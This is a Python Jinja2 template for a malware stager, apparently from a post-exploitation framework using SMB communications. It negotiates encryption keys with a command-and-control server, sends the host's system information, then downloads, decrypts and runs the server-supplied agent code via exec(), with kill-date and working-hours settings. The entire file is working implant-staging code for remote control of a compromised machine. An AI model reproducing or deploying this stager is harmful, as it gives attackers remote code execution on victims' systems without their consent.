#!/usr/bin/env python3

"""
This file is a Jinja2 template.
    Variables:
        working_hours
        kill_date
        staging_key
        profile
"""

import base64
import random
import string

{% include 'common/rc4.py' %}
{% include 'common/aes.py' %}
{% include 'common/diffiehellman.py' %}
{% include 'common/get_sysinfo.py' %}
{% include 'smb/comms.py' %}


# generate a randomized sessionID
sessionID = b''.join(random.choice(string.ascii_uppercase + string.digits).encode('UTF-8') for _ in range(8))

# server configuration information
stagingKey = b'{{ staging_key }}'
profile = '{{ profile }}'
WorkingHours = '{{ working_hours }}'
KillDate = '{{ kill_date }}'
server = ''

parts = profile.split('|')
taskURIs = parts[0].split(',')
userAgent = parts[1]
headersRaw = parts[2:]

# global header dictionary
#   sessionID is set by stager.py
# headers = {'User-Agent': userAgent, "Cookie": "SESSIONID=%s" % (sessionID)}
headers = {'User-Agent': userAgent}

# parse the headers into the global header dictionary
for headerRaw in headersRaw:
    try:
        headerKey = headerRaw.split(":")[0]
        headerValue = headerRaw.split(":")[1]
        if headerKey.lower() == "cookie":
            headers['Cookie'] = "%s;%s" % (headers['Cookie'], headerValue)
        else:
            headers[headerKey] = headerValue
    except:
        pass

# stage 3 of negotiation -> client generates DH key, and POSTs HMAC(AESn(PUBc)) back to server
clientPub=DiffieHellman()
public_key = str(clientPub.publicKey).encode('UTF-8')
hmacData=aes_encrypt_then_hmac(stagingKey,public_key)

# RC4 routing packet:
#   meta = STAGE1 (2)
routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=2, encData=hmacData)

#try:
#postURI = server + "{{ stage_1 | default('/index.jsp', true) | ensureleadingslash }}"
# response = post_message(postURI, routingPacket+hmacData)
b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
send_queue.Enqueue("2" + b64routingPacket)

while receive_queue.Count == 0:
    time.sleep(1)

data = receive_queue.Peek()
print(data)
response = base64.b64decode(data)
receive_queue.Dequeue()
print(response)

# decrypt the server's public key and the server nonce
packet = aes_decrypt_and_verify(stagingKey, response)
nonce = packet[0:16]
serverPub = int(packet[16:])

# calculate the shared secret
clientPub.genKey(serverPub)
key = clientPub.key


# step 5 -> client POSTs HMAC(AESs([nonce+1]|sysinfo)
hmacData = aes_encrypt_then_hmac(key, get_sysinfo(nonce=str(int(nonce)+1)).encode('UTF-8'))

# RC4 routing packet:
#   sessionID = sessionID
#   language = PYTHON (2)
#   meta = STAGE2 (3)
#   extra = 0
#   length = len(length)
routingPacket = build_routing_packet(stagingKey=stagingKey, sessionID=sessionID, meta=3, encData=hmacData)
b64routingPacket = base64.b64encode(routingPacket).decode('UTF-8')
send_queue.Enqueue("2" + b64routingPacket)

while receive_queue.Count == 0:
    time.sleep(1)

data = receive_queue.Peek()
response = base64.b64decode(data)
receive_queue.Dequeue()

# step 6 -> server sends HMAC(AES)
agent = aes_decrypt_and_verify(key, response)
agent = agent.replace('{{ working_hours }}', WorkingHours)
agent = agent.replace('{{ kill_date }}', KillDate)

exec(agent)
